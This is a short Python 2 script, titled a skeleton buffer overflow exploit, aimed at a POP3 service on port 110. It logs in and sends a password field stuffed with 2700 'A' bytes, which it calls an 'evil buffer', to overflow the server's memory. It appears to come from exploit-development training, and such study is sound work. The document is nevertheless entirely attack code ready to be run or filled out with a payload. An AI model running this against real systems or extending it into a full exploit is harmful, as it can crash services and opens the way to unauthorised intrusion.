#!/usr/bin/python
import socket
#Skeleton buffer overflow exploit.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'A' * 2700 #number of bytes that caused a buffer crash or pattern_create string


try:
	print "\nSending evil buffer..."
	s.connect(('TargetIP',110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"